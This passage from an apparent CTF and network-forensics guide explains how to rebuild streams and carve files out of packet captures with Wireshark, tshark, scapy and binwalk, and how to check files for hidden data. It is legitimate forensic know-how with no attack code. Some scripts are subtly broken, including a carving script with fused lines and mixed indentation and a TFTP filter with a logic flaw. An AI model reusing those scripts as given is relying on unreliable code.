# Extract all files from PCAP
chaosreader capture.pcap

# Creates directory with extracted files and HTML report
ls -la ./

# Extracted files are named by session and type
# Example: session_0001.html, image_0042.jpg
```

**Chaosreader Output:**

- HTML index with session summaries
- Individual files per session
- Image files
- HTML pages
- Text content

## Manual Stream Reconstruction

Manual stream reconstruction is essential when automated tools fail or when dealing with custom protocols, fragmented data, or intentionally obfuscated transfers.

### TCP Stream Reconstruction in Wireshark

**Method 1: Follow TCP Stream**

```bash
# Select packet in conversation
Right-click → Follow → TCP Stream

# Or use keyboard shortcut
Ctrl + Alt + Shift + T
```

**Stream Window Features:**

- **Stream Number**: Displays current stream (use arrows to navigate)
- **Find**: Search within stream data
- **Filter**: Shows current display filter for this stream
- **Show Data As**:
    - ASCII
    - EBCDIC
    - Hex Dump
    - C Arrays
    - Raw
    - UTF-8
    - UTF-16
    - YAML

**Direction Filtering:**

Use dropdown to view:

- Entire conversation (both directions)
- Client → Server (data sent by client)
- Server → Client (data sent by server)

**Saving Stream Data:**

```
Save As → Choose format:
- Raw (binary data)
- ASCII
- UTF-8
- C Arrays (for code injection analysis)
```

**Stream Filter Syntax:**

After following stream, Wireshark applies filter:

```bash
tcp.stream eq 0
```

Modify to view multiple streams:

```bash
tcp.stream eq 0 || tcp.stream eq 5
```

### UDP Stream Reconstruction

```bash
# Follow UDP stream
Right-click packet → Follow → UDP Stream

# UDP streams lack acknowledgment, so reconstruction is simpler
# Filter: udp.stream eq 0
```

**UDP Stream Characteristics:**

- No guaranteed delivery (may have gaps)
- No ordering guarantees (packets may be out of sequence)
- Useful for DNS, TFTP, streaming protocols

### HTTP Stream Reconstruction

```bash
# Follow HTTP stream
Right-click packet → Follow → HTTP Stream

# More refined than TCP stream for HTTP
# Automatically parses headers and body
```

**HTTP Stream Advantages:**

- Separates headers from body
- Handles chunked transfer encoding
- Processes HTTP/1.1 pipelining
- Displays multiple requests/responses in single TCP stream

### Manual File Extraction from TCP Streams

**Step-by-Step Process:**

**1. Identify File Transfer:**

```bash
# Look for Content-Type headers in HTTP
http.content_type contains "application"
http.content_type contains "image"
http.content_type contains "video"

# Or large data transfers
tcp.len > 1000 && tcp.port == 80
```

**2. Follow TCP Stream:**

```bash
# Right-click packet → Follow → TCP Stream
# Switch to "Raw" format
# Save As → Save raw data
```

**3. Remove Protocol Headers:**

For HTTP files, manually remove HTTP headers:

```bash
# Original stream contains:
HTTP/1.1 200 OK
Content-Type: image/png
Content-Length: 12345

[PNG binary data]

# Extract only binary data portion
# Using hex editor or command line:
```

**4. Extract Using Hex Editor:**

```bash
# Open saved stream in hex editor
xxd saved_stream.raw | less

# Find file signature (e.g., PNG: 89 50 4E 47)
# Note offset where file data begins
# Extract from that offset

# Using dd command
dd if=saved_stream.raw of=extracted_file.png bs=1 skip=OFFSET
```

**Example: Extract PNG from HTTP Stream**

```bash
# 1. Follow TCP stream, save as raw
# 2. Find PNG signature (89 50 4E 47 0D 0A 1A 0A)

# Use grep to find offset
grep -abo $'\x89\x50\x4E\x47' saved_stream.raw

# Example output: 234:...
# Means PNG starts at byte 234

# Extract from offset
dd if=saved_stream.raw of=image.png bs=1 skip=234

# Verify file
file image.png
# Output: image.png: PNG image data, 800 x 600, 8-bit/color RGB
```

### Using tshark for Stream Extraction

```bash
# Export all HTTP objects (easier method)
tshark -r capture.pcap --export-objects http,output_dir/

# Export specific TCP stream to file
tshark -r capture.pcap -z "follow,tcp,raw,0" > stream_0.raw

# Extract stream in hex format
tshark -r capture.pcap -z "follow,tcp,hex,0" > stream_0.hex

# Extract stream in ASCII
tshark -r capture.pcap -z "follow,tcp,ascii,0" > stream_0.txt

# Extract multiple streams with loop
for i in {0..10}; do
    tshark -r capture.pcap -z "follow,tcp,raw,$i" > stream_${i}.raw
done
```

### Stream Reassembly with scapy

```python
#!/usr/bin/env python3
# tcp_stream_extractor.py

from scapy.all import *
from collections import defaultdict

def extract_tcp_stream(pcap_file, src_ip, dst_ip, dst_port):
    """Extract and reassemble TCP stream"""
    
    packets = rdpcap(pcap_file)
    stream_data = defaultdict(bytes)
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            if (pkt[IP].src == src_ip and 
                pkt[IP].dst == dst_ip and 
                pkt[TCP].dport == dst_port):
                
                seq = pkt[TCP].seq
                data = bytes(pkt[Raw].load)
                stream_data[seq] = data
    
    # Reassemble in sequence order
    reassembled = b''.join(stream_data[seq] for seq in sorted(stream_data.keys()))
    
    return reassembled

# Usage
if __name__ == '__main__':
    data = extract_tcp_stream('capture.pcap', '192.168.1.100', '10.0.0.5', 80)
    
    with open('extracted_stream.bin', 'wb') as f:
        f.write(data)
    
    print(f"Extracted {len(data)} bytes")
```

### FTP File Reconstruction

FTP uses separate control (port 21) and data channels (dynamic ports).

**Manual FTP Extraction:**

```bash
# 1. Find FTP control channel
ftp

# 2. Identify RETR or STOR command
ftp.request.command == "RETR" || ftp.request.command == "STOR"

# 3. Note filename
tshark -r capture.pcap -Y "ftp.request.command == RETR" -T fields -e ftp.request.arg

# 4. Find corresponding data channel
# Look at PORT or PASV command for data port
ftp.request.command == "PORT" || ftp.response.code == 227

# 5. Extract data from ftp-data channel
tshark -r capture.pcap -Y "ftp-data" -T fields -e data.data > ftp_data_hex.txt

# 6. Convert hex to binary
cat ftp_data_hex.txt | xxd -r -p > extracted_file.bin
```

**Automated FTP Extraction Script:**

```bash
#!/bin/bash
# ftp_extractor.sh

PCAP=$1

echo "[*] Finding FTP file transfers..."

# Extract RETR commands (downloads)
tshark -r $PCAP -Y "ftp.request.command == RETR" -T fields \
-e frame.number -e ftp.request.arg | while read frame filename; do
    
    echo "[+] Found download: $filename at frame $frame"
    
    # Find corresponding data transfer
    # FTP data typically follows RETR command
    tshark -r $PCAP -Y "frame.number > $frame && ftp-data && tcp.len > 0" \
    -T fields -e tcp.payload | head -1 | xxd -r -p > "extracted_$filename"
    
    echo "[*] Extracted to: extracted_$filename"
done
```

### SMB/CIFS File Extraction

```bash
# Identify SMB file operations
smb || smb2

# SMB Read Request
smb2.cmd == 8  # SMB2 Read

# SMB Write Request
smb2.cmd == 9  # SMB2 Write

# Find filename
smb2.filename

# Extract SMB file data
tshark -r capture.pcap -Y "smb2.cmd == 8" -T fields -e smb2.file.data

# For SMB1
smb.file_data
```

**SMB Extraction Challenges:**

- Files may be transferred in multiple chunks
- Requires reassembly based on file handles
- May need to correlate Open/Read/Close operations

### TFTP File Reconstruction

TFTP uses UDP port 69 with simple protocol structure.

```bash
# Find TFTP transfers
tftp

# Read Request
tftp.opcode == 1

# Write Request
tftp.opcode == 2

# Data packets
tftp.opcode == 3

# Extract TFTP data packets
tshark -r capture.pcap -Y "tftp.opcode == 3" -T fields -e tftp.data | \
xxd -r -p > extracted_tftp_file.bin
```

**TFTP Reconstruction Script:**

```python
#!/usr/bin/env python3
# tftp_extractor.py

from scapy.all import *

def extract_tftp_file(pcap_file, output_file):
    """Extract file from TFTP transfer"""
    
    packets = rdpcap(pcap_file)
    tftp_data = {}
    
    for pkt in packets:
        if pkt.haslayer(UDP) and pkt[UDP].dport == 69 or pkt[UDP].sport == 69:
            if pkt.haslayer(Raw):
                payload = bytes(pkt[Raw].load)
                
                # TFTP Data packet (opcode 3)
                if len(payload) > 4 and payload[1] == 3:
                    block_num = int.from_bytes(payload[2:4], 'big')
                    data = payload[4:]
                    tftp_data[block_num] = data
    
    # Reassemble blocks in order
    with open(output_file, 'wb') as f:
        for block in sorted(tftp_data.keys()):
            f.write(tftp_data[block])
    
    print(f"[+] Extracted {len(tftp_data)} blocks to {output_file}")

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <pcap> <output_file>")
        sys.exit(1)
    
    extract_tftp_file(sys.argv[1], sys.argv[2])
```

### Email Reconstruction

**SMTP Email Extraction:**

```bash
# Find SMTP DATA command
smtp.data.fragment || smtp.req.command == "DATA"

# Extract email content
tshark -r capture.pcap -Y "smtp.data.fragment" -T fields -e smtp.data.fragment | \
tr -d ':' | xxd -r -p > email.eml

# View email
cat email.eml

# Or open in mail client
thunderbird email.eml
```

**POP3 Email Extraction:**

```bash
# Find RETR command (retrieve email)
pop.request.command == "RETR"

# Extract email data
tshark -r capture.pcap -Y "pop.response.indicator == +OK" -T fields -e pop.response.data
```

**IMAP Email Extraction:**

```bash
# IMAP is more complex due to protocol structure
imap

# Find FETCH commands
imap.request contains "FETCH"

# Extract message bodies
tshark -r capture.pcap -Y "imap.response" -T fields -e imap.response
```

### Handling Chunked Transfer Encoding

HTTP chunked transfer encoding splits response body into chunks.

```bash
# Identify chunked encoding
http.transfer_encoding == "chunked"

# Wireshark automatically reassembles chunked data in Follow Stream
# For manual extraction:
```

**Chunked Format:**

```
[chunk size in hex]\r\n
[chunk data]\r\n
[chunk size in hex]\r\n
[chunk data]\r\n
0\r\n
\r\n
```

**Python Script to Parse Chunked Data:**

```python
#!/usr/bin/env python3
# dechunk_http.py

def dechunk(chunked_data):
    """Parse HTTP chunked transfer encoding"""
    
    result = b''
    pos = 0
    data = chunked_data
    
    while pos < len(data):
        # Find chunk size line
        chunk_size_end = data.find(b'\r\n', pos)
        if chunk_size_end == -1:
            break
        
        # Parse chunk size (hex)
        chunk_size_hex = data[pos:chunk_size_end].decode('ascii')
        try:
            chunk_size = int(chunk_size_hex, 16)
        except ValueError:
            break
        
        if chunk_size == 0:
            break
        
        # Extract chunk data
        chunk_start = chunk_size_end + 2
        chunk_end = chunk_start + chunk_size
        result += data[chunk_start:chunk_end]
        
        # Move past chunk and trailing \r\n
        pos = chunk_end + 2
    
    return result

# Usage
with open('chunked_stream.raw', 'rb') as f:
    chunked = f.read()

dechunked = dechunk(chunked)

with open('dechunked_file.bin', 'wb') as f:
    f.write(dechunked)
```

## File Signature Analysis

File signature analysis (magic number identification) is crucial for identifying file types, detecting file type mismatches, and carving files from raw data streams.

### Common File Signatures

**Image Formats:**

```
PNG:  89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF E0 (JFIF) or FF D8 FF E1 (EXIF)
GIF:  47 49 46 38 37 61 (GIF87a) or 47 49 46 38 39 61 (GIF89a)
BMP:  42 4D
TIFF: 49 49 2A 00 (little-endian) or 4D 4D 00 2A (big-endian)
ICO:  00 00 01 00
WebP: 52 49 46 46 xx xx xx xx 57 45 42 50
```

**Document Formats:**

```
PDF:  25 50 44 46 (% PDF)
ZIP:  50 4B 03 04 or 50 4B 05 06 (empty archive)
RAR:  52 61 72 21 1A 07 (Rar!)
GZIP: 1F 8B
TAR:  (no magic, but has "ustar" at offset 257)
7Z:   37 7A BC AF 27 1C

DOCX: 50 4B 03 04 (ZIP container, check for word/ directory)
XLSX: 50 4B 03 04 (ZIP container, check for xl/ directory)
PPTX: 50 4B 03 04 (ZIP container, check for ppt/ directory)

DOC:  D0 CF 11 E0 A1 B1 1A E1 (OLE2)
XLS:  D0 CF 11 E0 A1 B1 1A E1 (OLE2)
PPT:  D0 CF 11 E0 A1 B1 1A E1 (OLE2)

RTF:  7B 5C 72 74 66 ({\rtf)
```

**Executable and Library Formats:**

```
EXE (Windows): 4D 5A (MZ)
ELF (Linux):   7F 45 4C 46 (.ELF)
Mach-O (macOS): CF FA ED FE or FE ED FA CE or FE ED FA CF or CF FA ED FE
CLASS (Java):   CA FE BA BE
DLL:            4D 5A (same as EXE)
SO (Linux):     7F 45 4C 46 (same as ELF)
```

**Archive and Compression:**

```
ZIP:    50 4B 03 04
RAR:    52 61 72 21 1A 07 00
GZIP:   1F 8B 08
BZIP2:  42 5A 68
XZ:     FD 37 7A 58 5A 00
TAR.GZ: 1F 8B 08 (GZIP header, TAR inside)
```

**Media Formats:**

```
MP3:  FF FB or FF F3 or FF F2 or ID33 (49 44 33)
MP4:  xx xx xx xx 66 74 79 70 (ftyp at offset 4)
AVI:  52 49 46 46 xx xx xx xx 41 56 49 20 (RIFF....AVI )
WAV:  52 49 46 46 xx xx xx xx 57 41 56 45 (RIFF....WAVE)
FLAC: 66 4C 61 43 (fLaC)
OGG:  4F 67 67 53 (OggS)
```

**Database Formats:**

```
SQLite: 53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33 00 (SQLite format 3.)
```

**Script and Source Code:**

```
Python:     23 21 2F 75 73 72 2F 62 69 6E 2F 70 79 74 68 6F 6E (#!/usr/bin/python) [Inference: Shebang line, not guaranteed]
Bash:       23 21 2F 62 69 6E 2F 62 61 73 68 (#!/bin/bash) [Inference: Shebang line, not guaranteed]
Perl:       23 21 2F 75 73 72 2F 62 69 6E 2F 70 65 72 6C (#!/usr/bin/perl) [Inference: Shebang line, not guaranteed]
```

### Using `file` Command

```bash
# Identify file type
file extracted_file.bin
# Output: extracted_file.bin: PNG image data, 800 x 600, 8-bit/color RGB

# Show MIME type
file -i extracted_file.bin
# Output: extracted_file.bin: image/png; charset=binary

# Show file type without filename
file -b extracted_file.bin
# Output: PNG image data, 800 x 600, 8-bit/color RGB

# Check magic database
file -m /usr/share/misc/magic extracted_file.bin

# Examine file without reading compressed content
file -z compressed.gz
```

### Using `binwalk` for Signature Scanning

```bash
# Install binwalk
sudo apt install binwalk

# Scan for file signatures
binwalk captured_stream.bin

# Extract embedded files
binwalk -e captured_stream.bin

# Extract to specific directory
binwalk -e -C output_dir captured_stream.bin

# Scan for specific signatures
binwalk --signature captured_stream.bin

# Show entropy (detect encryption/compression)
binwalk -E captured_stream.bin

# Hexdump interesting areas
binwalk -W captured_stream.bin

# Verbose mode with detailed analysis
binwalk -v captured_stream.bin

# Extract and recursively scan
binwalk -Me captured_stream.bin
```

**Binwalk Output Example:**

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1024 x 768, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
15234         0x3B82          JPEG image data, JFIF standard 1.01
89456         0x15D70         ZIP archive data
```

### Using `foremost` for File Carving

```bash
# Install foremost
sudo apt install foremost

# Carve files from raw data
foremost -t all -i captured_stream.bin -o carved_files/

# Carve specific file types
foremost -t jpg,png,pdf -i captured_stream.bin -o images_docs/

# Verbose output
foremost -v -t all -i captured_stream.bin -o output/

# Use custom configuration
foremost -c /etc/foremost.conf -i captured_stream.bin -o output/
```

**Supported File Types:**

```
jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp
```

**Foremost Configuration:**

Edit `/etc/foremost.conf` to add custom signatures:

```bash
# Format: extension  case  size  header  footer
png  y  10000000  \x89\x50\x4e\x47  \x49\x45\x4e\x44\xae\x42\x60\x82
jpg  y  10000000  \xff\xd8\xff\xe0  \xff\xd9
```

### Using `scalpel` for Advanced Carving

```bash
# Install scalpel
sudo apt install scalpel

# Configure scalpel
sudo nano /etc/scalpel/scalpel.conf

# Uncomment desired file types:
# png  y   10000000   \x89\x50\x4e\x47   \x49\x45\x4e\x44\xae\x42\x60\x82
# jpg  y   10000000   \xff\xd8\xff\xe0   \xff\xd9

# Run scalpel
scalpel -c /etc/scalpel/scalpel.conf -o output_dir captured_stream.bin

# Preview mode (don't extract, just identify)
scalpel -p -c /etc/scalpel/scalpel.conf captured_stream.bin
```

### Manual File Signature Detection with `xxd`

```bash
# View hex dump
xxd captured_stream.bin | less

# Search for PNG signature
xxd captured_stream.bin | grep "8950 4e47"

# Extract specific byte range
xxd -s 0x1000 -l 512 captured_stream.bin

# Find all occurrences of signature
xxd captured_stream.bin | grep -n "8950 4e47"
```

### Python Script for Signature-Based File Carving

```python
#!/usr/bin/env python3
# file_carver.py

import sys

# File signatures (magic numbers)
SIGNATURES = {
    'PNG':  (b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A', b'\x49\x45\x4E\x44\xAE\x42\x60\x82', '.png'),
    'JPEG': (b'\xFF\xD8\xFF', b'\xFF\xD9', '.jpg'),
    'GIF':  (b'\x47\x49\x46\x38', None, '.gif'),
    'PDF':  (b'\x25\x50\x44\x46', b'\x25\x25\x45\x4F\x46', '.pdf'),
    'ZIP':  (b'\x50\x4B\x03\x04', None, '.zip'),
    'RAR':  (b'\x52\x61\x72\x21\x1A\x07', None, '.rar'),
    'EXE':  (b'\x4D\x5A', None, '.exe'),
    'ELF':  (b'\x7F\x45\x4C\x46', None, '.elf'),
}

def carve_files(data, output_prefix='carved'):
    """Carve files from binary data based on signatures"""
    
    carved_count = 0
    
    for file_type, (header, footer, extension) in SIGNATURES.items():
        print(f"[*] Searching for {file_type} files...")
        
        pos = 0
        while True:
            # Find header
            start = data.find(header, pos)
            if start == -1:
                break
            
            # Find footer if defined
            if footer:
                end = data.find(footer, start + len(header))
                if end == -1:
                    # No footer found, try next header
                    pos = start + len(header)
                    continue
                end += len(footer)
            else:
                # No footer defined, search for next header or EOF
                next_start = data.find(header, start + len(header))
                if next_start == -1:
                    end = len(data)
                else:
                    end = next_start
            
            # Extract file
            carved_data = data[start:end]
            output_file = f"{output_prefix}_{file_type}_{carved_count}{extension}"
            
            with open(output_file, 'wb') as f:
                f.write(carved_data)
            
            print(f"[+] Carved: {output_file} ({len(carved_data)} bytes)")
            carved_count += 1
            
            # Move past this file
            pos = end
    
    print(f"\n[*] Total files carved: {carved_count}") return carved_count

def identify_file_type(data): 
	"""Identify file type from header bytes"""

	for file_type, (header, footer, extension) in SIGNATURES.items():
	    if data.startswith(header):
	        return file_type, extension
	
	return 'Unknown', '.bin'

def main(): 
	if len(sys.argv) < 2: 
		print(f"Usage: {sys.argv[0]} <input_file> [output_prefix]") 
		sys.exit(1)

	input_file = sys.argv[1]
	output_prefix = sys.argv[2] if len(sys.argv) > 2 else 'carved'
	
	print(f"[*] Reading {input_file}...")
	with open(input_file, 'rb') as f:
	    data = f.read()
	
	print(f"[*] File size: {len(data)} bytes")
	print(f"[*] Starting file carving...\n")
	
	carve_files(data, output_prefix)

if __name__ == '__main__':
	main()
````

**Usage:**

```bash
chmod +x file_carver.py
./file_carver.py captured_stream.bin carved_file
````

### Advanced Signature Analysis with `hexdump`

```bash
# Standard hexdump format
hexdump -C captured_stream.bin | less

# Show only first 256 bytes
hexdump -C -n 256 captured_stream.bin

# Search for specific pattern
hexdump -C captured_stream.bin | grep "89 50 4e 47"

# Custom format (offset, hex, ASCII)
hexdump -e '16/1 "%02x " "\n"' captured_stream.bin
```

### Entropy Analysis for Detecting Encryption/Compression

High entropy indicates encryption, compression, or random data.

```bash
# Using binwalk entropy analysis
binwalk -E captured_stream.bin

# Creates entropy graph showing compression/encryption regions
binwalk -E -J captured_stream.bin  # Save as PNG
```

**Python Entropy Calculator:**

```python
#!/usr/bin/env python3
# entropy_calculator.py

import sys
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy of byte sequence"""
    
    if not data:
        return 0
    
    # Count byte frequencies
    counter = Counter(data)
    length = len(data)
    
    # Calculate entropy
    entropy = 0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def analyze_file(filename, block_size=1024):
    """Analyze file entropy in blocks"""
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    print(f"[*] File: {filename}")
    print(f"[*] Size: {len(data)} bytes")
    print(f"[*] Overall entropy: {calculate_entropy(data):.4f} bits/byte")
    print(f"\n[*] Block-wise entropy analysis (block size: {block_size}):\n")
    
    offset = 0
    high_entropy_blocks = []
    
    while offset < len(data):
        block = data[offset:offset + block_size]
        entropy = calculate_entropy(block)
        
        status = ""
        if entropy > 7.5:
            status = " [HIGH - Likely encrypted/compressed]"
            high_entropy_blocks.append(offset)
        elif entropy > 6.0:
            status = " [MEDIUM - Possibly compressed]"
        elif entropy < 4.0:
            status = " [LOW - Likely text/structured data]"
        
        print(f"Offset 0x{offset:08x}: {entropy:.4f}{status}")
        offset += block_size
    
    if high_entropy_blocks:
        print(f"\n[!] Found {len(high_entropy_blocks)} high-entropy blocks")
        print("[*] Possible encrypted or compressed data at offsets:")
        for offset in high_entropy_blocks:
            print(f"    0x{offset:08x}")
    
    return calculate_entropy(data)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file>")
        sys.exit(1)
    
    analyze_file(sys.argv[1])
```

### Detecting Steganography

**Using `steghide`:**

```bash
# Install steghide
sudo apt install steghide

# Detect steganography info (without extracting)
steghide info image.jpg

# Extract hidden data (requires password)
steghide extract -sf image.jpg -xf output.txt

# Extract without password prompt (if no password)
steghide extract -sf image.jpg -p "" -xf output.txt
```

**Using `stegdetect`:**

```bash
# Install stegdetect
sudo apt install stegdetect

# Detect steganography in JPEG files
stegdetect image.jpg

# Detect with specific methods
stegdetect -tjopi image.jpg
# t = test
# j = jsteg
# o = outguess
# p = jphide
# i = invisible secrets
```

**Using `zsteg` for PNG/BMP:**

```bash
# Install zsteg
gem install zsteg

# Scan for hidden data
zsteg image.png

# Verbose output
zsteg -a image.png

# Extract specific LSB plane
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.bin
```

**Using `exiftool` for Metadata:**

```bash
# Install exiftool
sudo apt install exiftool

# Extract all metadata
exiftool image.jpg

# Specific metadata fields
exiftool -Comment image.jpg
exiftool -UserComment image.jpg

# Check for hidden data in metadata
exiftool -b -Comment image.jpg | xxd

# Recursive extraction for documents
exiftool -r -ext jpg,png directory/
```

### File Type Mismatch Detection

Detecting files with incorrect extensions based on signatures:

```bash
#!/bin/bash
# file_mismatch_detector.sh

for file in *; do
    if [ -f "$file" ]; then
        # Get actual file type
        actual_type=$(file -b "$file" | cut -d',' -f1)
        
        # Get extension
        extension="${file##*.}"
        
        # Check for common mismatches
        case "$extension" in
            jpg|jpeg)
                if [[ ! "$actual_type" =~ "JPEG" ]]; then
                    echo "[!] Mismatch: $file (Extension: $extension, Actual: $actual_type)"
                fi
                ;;
            png)
                if [[ ! "$actual_type" =~ "PNG" ]]; then
                    echo "[!] Mismatch: $file (Extension: $extension, Actual: $actual_type)"
                fi
                ;;
            pdf)
                if [[ ! "$actual_type" =~ "PDF" ]]; then
                    echo "[!] Mismatch: $file (Extension: $extension, Actual: $actual_type)"
                fi
                ;;
            zip)
                if [[ ! "$actual_type" =~ "Zip" ]] && [[ ! "$actual_type" =~ "Java" ]]; then
                    echo "[!] Mismatch: $file (Extension: $extension, Actual: $actual_type)"
                fi
                ;;
            txt)
                if [[ ! "$actual_type" =~ "text" ]] && [[ ! "$actual_type" =~ "ASCII" ]]; then
                    echo "[!] Mismatch: $file (Extension: $extension, Actual: $actual_type)"
                fi
                ;;
        esac
    fi
done
```

### Compound File Analysis

Some file formats are containers (ZIP, OLE2, etc.) that may contain multiple files.

**Analyzing ZIP-based formats:**

```bash
# DOCX, XLSX, PPTX, JAR, APK are ZIP containers
unzip -l document.docx

# Extract contents
unzip document.docx -d docx_contents/

# Check for embedded files
cd docx_contents/word/media/
file *
```

**Analyzing OLE2 formats (DOC, XLS, PPT):**

```bash
# Install ssdeep and olefile
pip3 install olefile

# Python script to analyze OLE2
python3 << 'EOF'
import olefile

ole = olefile.OleFileIO('document.doc')

# List all streams
print("[*] OLE2 Streams:")
for stream in ole.listdir():
    print(f"  {'/'.join(stream)}")

# Extract specific stream
if ole.exists('WordDocument'):
    data = ole.openstream('WordDocument').read()
    with open('extracted_word_stream.bin', 'wb') as f:
        f.write(data)
    print("[+] Extracted WordDocument stream")

ole.close()
EOF
```

**Analyzing PDF structure:**

```bash
# Install pdfinfo and pdfimages
sudo apt install poppler-utils

# View PDF structure
pdfinfo document.pdf

# Extract images from PDF
pdfimages document.pdf output_prefix

# Extract text
pdftotext document.pdf output.txt

# Examine PDF structure with mutool
mutool show document.pdf outline
mutool show document.pdf trailer
mutool show document.pdf grep /JavaScript

# Check for embedded files
pdfdetach -list document.pdf

# Extract embedded files
pdfdetach -saveall -o output_dir document.pdf
```

### Practical CTF File Carving Scenarios

**Scenario 1: Multiple Files in Single TCP Stream**

```bash
# 1. Export TCP stream
tshark -r capture.pcap -z "follow,tcp,raw,0" > stream_0.raw

# 2. Convert to binary
cat stream_0.raw | xxd -r -p > stream_0.bin

# 3. Search for file signatures
xxd stream_0.bin | grep -E "(8950 4e47|ffd8 ffe0|2550 4446)"

# 4. Note offsets and extract
# PNG at offset 0x500
dd if=stream_0.bin of=image.png bs=1 skip=$((0x500))

# 5. Use automated carver
binwalk -e stream_0.bin
```

**Scenario 2: Corrupted File Header**

```bash
# File won't open due to corrupted header
file corrupted_image.png
# Output: data

# Check for partial signature
xxd corrupted_image.png | head -5

# If PNG data structure exists but header missing:
# PNG signature: 89 50 4E 47 0D 0A 1A 0A
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | cat - corrupted_image.png > fixed_image.png

# Verify
file fixed_image.png
```

**Scenario 3: Hidden Archive in Image**

```bash
# Check file size vs. expected size
ls -lh image.jpg

# Scan for embedded files
binwalk image.jpg

# Output shows ZIP signature at offset
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             JPEG image data
# 45678         0xB26E          ZIP archive data

# Extract from offset
dd if=image.jpg of=hidden.zip bs=1 skip=45678

# Unzip
unzip hidden.zip
```

**Scenario 4: Flag in Metadata**

```bash
# Check image metadata
exiftool image.jpg | grep -i flag
exiftool image.jpg | grep -i comment

# Extract specific field
exiftool -Comment image.jpg

# Check for base64-encoded data
exiftool -Comment image.jpg | base64 -d

# Check all metadata fields
exiftool -a -G1 image.jpg

# Extract thumbnail (may contain hidden data)
exiftool -b -ThumbnailImage image.jpg > thumbnail.jpg
```

**Scenario 5: Polyglot Files**

Polyglot files are valid in multiple formats simultaneously.

```bash
# File appears as both ZIP and PNG
file polyglot.png
# Output: PNG image data...

# But also contains ZIP
binwalk polyglot.png
# Shows ZIP signature

# Extract as ZIP
cp polyglot.png polyglot.zip
unzip polyglot.zip

# Or use binwalk
binwalk -e polyglot.png
```

**Scenario 6: Data Exfiltration in Image LSB**

```bash
# Use zsteg to detect LSB steganography
zsteg -a image.png

# Extract LSB data
zsteg -E "b1,rgb,lsb,xy" image.png > extracted.bin

# Check extracted data
file extracted.bin
xxd extracted.bin | head

# If text data
strings extracted.bin | grep flag
```

### Automated Multi-Tool Carving Script

```bash
#!/bin/bash
# comprehensive_file_carver.sh

TARGET=$1
OUTPUT_DIR="carving_results_$(date +%s)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <file_or_pcap>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Starting comprehensive file carving on: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"
echo

# Step 1: Basic file identification
echo "[*] Step 1: File identification"
file "../$TARGET" | tee file_type.txt
echo

# Step 2: String extraction
echo "[*] Step 2: Extracting strings"
strings "../$TARGET" > strings.txt
grep -i "flag\|password\|key\|secret" strings.txt > interesting_strings.txt
echo "[+] Found $(wc -l < interesting_strings.txt) interesting strings"
echo

# Step 3: Binwalk analysis
echo "[*] Step 3: Binwalk signature scan"
binwalk "../$TARGET" | tee binwalk_scan.txt
binwalk -e "../$TARGET" 2>/dev/null
echo

# Step 4: Foremost carving
echo "[*] Step 4: Foremost file carving"
mkdir -p foremost_output
foremost -t all -i "../$TARGET" -o foremost_output/ -q
echo "[+] Foremost carved $(find foremost_output -type f | wc -l) files"
echo

# Step 5: Entropy analysis
echo "[*] Step 5: Entropy analysis"
binwalk -E "../$TARGET" | tee entropy_analysis.txt
echo

# Step 6: Hexdump analysis
echo "[*] Step 6: Generating hexdump"
xxd "../$TARGET" | head -100 > hexdump_header.txt
echo

# Step 7: Metadata extraction
echo "[*] Step 7: Metadata extraction"
exiftool "../$TARGET" > metadata.txt 2>/dev/null || echo "No metadata found"
echo

# Summary
echo "================================"
echo "[*] Carving Complete!"
echo "================================"
echo "Results saved in: $OUTPUT_DIR"
echo
echo "File counts:"
echo "  Binwalk extracted: $(find . -name '*binwalk*' -type d -exec sh -c 'find "$1" -type f | wc -l' _ {} \; 2>/dev/null | awk '{s+=$1} END {print s}')"
echo "  Foremost carved: $(find foremost_output -type f 2>/dev/null | wc -l)"
echo "  Interesting strings: $(wc -l < interesting_strings.txt)"
echo
echo "Recommended next steps:"
echo "  1. Review binwalk_scan.txt for embedded files"
echo "  2. Check interesting_strings.txt for credentials/flags"
echo "  3. Examine foremost_output/ for recovered files"
echo "  4. Review metadata.txt for hidden information"
```

**Usage:**

```bash
chmod +x comprehensive_file_carver.sh
./comprehensive_file_carver.sh captured_stream.bin
```

### Important Considerations for CTF File Carving

1. **Multiple Embedded Files**: Always scan entire file, not just beginning
2. **Reversed/XOR'd Data**: Check for XOR patterns using binwalk or custom scripts
3. **Partial Files**: Fragments may be intentionally split across multiple packets
4. **Encrypted Segments**: High entropy regions may require keys found elsewhere
5. **Custom Protocols**: May need manual parsing based on challenge context
6. **Timestamps**: File modification times may contain clues
7. **File Size Anomalies**: Check if declared size matches actual size
8. **Extension Spoofing**: Always verify with signature, not extension
9. **Archive Within Archive**: Recursively extract nested archives
10. **Deleted File Remnants**: Check for data after file footer

### Related Advanced Topics

[Inference: These topics extend file carving capabilities] Advanced steganography detection, memory dump analysis, filesystem forensics, malware unpacking, encrypted container analysis.

---

# Encrypted Traffic Analysis

## TLS/SSL Handshake Analysis

### Handshake Process Overview

The TLS/SSL handshake establishes secure communications through a multi-stage negotiation:

**Standard TLS 1.2 Handshake Flow:**

1. **ClientHello** - Client sends supported cipher suites, TLS version, random bytes, session ID
2. **ServerHello** - Server selects cipher suite, confirms TLS version, sends random bytes
3. **Certificate** - Server sends X.509 certificate chain
4. **ServerKeyExchange** - Server sends additional key exchange parameters (for DHE/ECDHE)
5. **ServerHelloDone** - Server signals completion of hello phase
6. **ClientKeyExchange** - Client sends encrypted pre-master secret or key exchange material
